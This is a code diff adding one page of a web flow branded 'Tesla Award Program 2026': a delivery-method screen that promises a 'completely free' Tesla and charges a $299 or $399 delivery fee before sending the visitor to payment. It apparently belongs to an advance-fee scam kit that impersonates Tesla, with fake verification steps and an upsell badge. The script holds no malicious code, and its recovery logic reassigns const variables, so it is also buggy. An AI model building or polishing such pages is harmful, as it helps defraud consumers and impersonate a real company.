@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Choose Delivery Method | Tesla Award Program 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    body{background:var(--light);}
+    .page-wrap{max-width:680px;margin:0 auto;padding:88px 24px 64px;}
+    .page-card{background:white;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.09);border:1.5px solid rgba(0,0,0,.05);padding:48px;}
+    @media(max-width:560px){.page-card{padding:28px 20px;border-radius:18px;}}
+    .page-icon{font-size:48px;margin-bottom:16px;text-align:center;}
+    .page-title{font-size:26px;font-weight:800;color:var(--dark);text-align:center;margin-bottom:8px;}
+    .page-sub{font-size:15px;color:var(--gray-2);text-align:center;line-height:1.65;margin-bottom:36px;}
+
+    /* Progress crumbs */
+    .crumbs{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--gray-2);margin-bottom:32px;justify-content:center;flex-wrap:wrap;}
+    .crumb-done{color:var(--success);font-weight:600;}
+    .crumb-active{color:var(--red);font-weight:700;}
+    .crumb-sep{color:var(--border);}
+
+    .option-card{background:white;border-radius:18px;border:2px solid var(--border);padding:28px;cursor:pointer;transition:all var(--transition);position:relative;overflow:hidden;margin-bottom:16px;}
+    .option-card:hover{border-color:rgba(227,25,55,.4);box-shadow:var(--shadow-md);transform:translateY(-2px);}
+    .option-card.selected{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,25,55,.12);}
+    .option-card.selected::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--red);}
+    .option-header{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;}
+    .option-icon{font-size:36px;}
+    .option-check{width:24px;height:24px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all var(--transition);}
+    .option-card.selected .option-check{background:var(--red);border-color:var(--red);color:white;font-size:12px;font-weight:700;}
+    .option-name{font-size:18px;font-weight:800;color:var(--dark);margin-bottom:2px;}
+    .option-days{font-size:13px;color:var(--gray-2);margin-bottom:12px;}
+    .option-price{font-size:28px;font-weight:900;color:var(--dark);}
+    .option-price span{font-size:14px;font-weight:400;color:var(--gray-2);}
+    .option-features{margin-top:16px;display:flex;flex-direction:column;gap:6px;}
+    .option-feature{display:flex;align-items:center;gap:8px;font-size:14px;color:var(--gray);}
+    .feature-check{width:18px;height:18px;background:rgba(0,165,80,.1);border-radius:50%;display:flex;align-items:center;justify-content:center;color:var(--success);font-size:10px;font-weight:700;flex-shrink:0;}
+    .recommended-badge{position:absolute;top:16px;right:16px;background:var(--red);color:white;font-size:11px;font-weight:700;padding:3px 10px;border-radius:999px;}
+
+    .order-summary{background:var(--light);border-radius:14px;padding:18px 20px;margin-bottom:28px;}
+    .summary-row{display:flex;align-items:center;justify-content:space-between;font-size:14px;padding:5px 0;}
+    .summary-row:not(:last-child){border-bottom:1px solid rgba(0,0,0,.06);}
+    .summary-label{color:var(--gray-2);}
+    .summary-value{color:var(--dark);font-weight:600;}
+  </style>
+  <link rel="icon" type="image/svg+xml" href="assets/tesla-award-logo.svg">
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+      TESLA
+    </a>
+    <a href="dashboard.html" class="btn btn-ghost" style="font-size:14px;">← Back</a>
+  </div>
+</nav>
+
+<div class="page-wrap">
+  <div class="crumbs">
+    <span class="crumb-done">✓ Verified</span><span class="crumb-sep">›</span>
+    <span class="crumb-done">✓ Vehicle Selected</span><span class="crumb-sep">›</span>
+    <span class="crumb-done">✓ Delivery Details</span><span class="crumb-sep">›</span>
+    <span class="crumb-active">Delivery Method</span><span class="crumb-sep">›</span>
+    <span>Payment</span>
+  </div>
+
+  <div class="page-card anim-fade-up">
+    <div class="page-icon">🚚</div>
+    <h1 class="page-title">Choose Your Delivery Method</h1>
+    <p class="page-sub">Select how you'd like your Tesla delivered. Both options include fully insured, professional vehicle transport.</p>
+
+    <!-- Car summary -->
+    <div class="order-summary" id="orderSummary">
+      <div class="summary-row">
+        <span class="summary-label">Selected Vehicle</span>
+        <span class="summary-value" id="summaryVehicle">Tesla —</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Delivery To</span>
+        <span class="summary-value" id="summaryAddress">—</span>
+      </div>
+    </div>
+
+    <!-- Standard Delivery -->
+    <div class="option-card" id="card-standard" onclick="selectMethod('standard')">
+      <div class="option-header">
+        <div>
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px;">
+            <span class="option-icon">📦</span>
+            <div>
+              <div class="option-name">Standard Delivery</div>
+              <div class="option-days">7 – 12 business days</div>
+            </div>
+          </div>
+          <div class="option-price">$299 <span>delivery fee</span></div>
+        </div>
+        <div class="option-check" id="check-standard">✓</div>
+      </div>
+      <div class="option-features">
+        <div class="option-feature"><div class="feature-check">✓</div> Standard international shipping & customs clearance</div>
+        <div class="option-feature"><div class="feature-check">✓</div> Fully insured vehicle transport</div>
+        <div class="option-feature"><div class="feature-check">✓</div> Email delivery notifications</div>
+        <div class="option-feature"><div class="feature-check">✓</div> Order tracking included</div>
+      </div>
+    </div>
+
+    <!-- Express Delivery -->
+    <div class="option-card" id="card-express" onclick="selectMethod('express')">
+      <div class="recommended-badge">Recommended</div>
+      <div class="option-header">
+        <div>
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px;">
+            <span class="option-icon">⚡</span>
+            <div>
+              <div class="option-name">Express Delivery</div>
+              <div class="option-days">1 – 3 business days</div>
+            </div>
+          </div>
+          <div class="option-price">$399 <span>delivery fee</span></div>
+        </div>
+        <div class="option-check" id="check-express">✓</div>
+      </div>
+      <div class="option-features">
+        <div class="option-feature"><div class="feature-check">✓</div> Priority shipping with expedited customs clearance</div>
+        <div class="option-feature"><div class="feature-check">✓</div> Real-time GPS tracking updates</div>
+        <div class="option-feature"><div class="feature-check">✓</div> Dedicated delivery specialist assigned</div>
+        <div class="option-feature"><div class="feature-check">✓</div> White-glove delivery service</div>
+        <div class="option-feature"><div class="feature-check">✓</div> Same-day dispatch guaranteed</div>
+      </div>
+    </div>
+
+    <button class="btn btn-primary btn-full btn-lg" id="continueBtn" onclick="continueToPayment()" disabled style="opacity:.45;cursor:not-allowed;margin-top:8px;">
+      Continue to Payment →
+    </button>
+
+    <p style="font-size:12px;color:var(--gray-2);text-align:center;margin-top:14px;">
+      Delivery fee covers professional vehicle transport, insurance, and logistics. Your Tesla itself is completely free.
+    </p>
+  </div>
+</div>
+
+<script src="js/config.js"></script>
+<script src="js/app.js"></script>
+<script>
+let selectedMethod = null;
+
+// Load saved data
+const savedCar = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');
+const savedDelivery = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
+
+// Try to recover from sessionStorage backup if localStorage empty
+if (!savedCar) {
+  try { savedCar = JSON.parse(sessionStorage.getItem('tesla_selected_car') || 'null'); } catch(_) { savedCar = null; }
+}
+if (!savedDelivery) { 
+  try { savedDelivery = JSON.parse(sessionStorage.getItem('tesla_delivery_details') || 'null'); } catch(_) { savedDelivery = null; }
+}
+// Only redirect if BOTH are truly missing after recovery attempt
+if (!savedCar || !savedDelivery) {
+  // Try one more time with alternative keys
+  try { savedCar = savedCar || JSON.parse(localStorage.getItem('selectedCar')); } catch(_) {}
+  try { savedDelivery = savedDelivery || JSON.parse(localStorage.getItem('deliveryDetails')); } catch(_) {}
+}
+if (!savedCar || !savedDelivery) { window.location.href = 'dashboard.html'; }
+
+// Populate summary
+document.getElementById('summaryVehicle').textContent = savedCar ? `Tesla ${savedCar.name} (${savedCar.color})` : '—';
+document.getElementById('summaryAddress').textContent = savedDelivery ? `${savedDelivery.city}, ${savedDelivery.country}` : '—';
+
+function selectMethod(method) {
+  selectedMethod = method;
+  document.querySelectorAll('.option-card').forEach(el => el.classList.remove('selected'));
+  document.getElementById(`card-${method}`).classList.add('selected');
+  const btn = document.getElementById('continueBtn');
+  btn.disabled = false; btn.style.opacity='1'; btn.style.cursor='pointer';
+}
+
+function continueToPayment() {
+  if (!selectedMethod) return;
+  const methodData = {
+    id: selectedMethod,
+    name: selectedMethod === 'express' ? 'Express Delivery' : 'Standard Delivery',
+    price: selectedMethod === 'express' ? 399 : 299,
+    priceDisplay: selectedMethod === 'express' ? '$399' : '$299',
+    days: selectedMethod === 'express' ? '1–3 days' : '7–12 days',
+  };
+  localStorage.setItem('tesla_delivery_method', JSON.stringify(methodData));
+  window.location.href = 'payment.html';
+}
+</script>
+</body>
+</html>
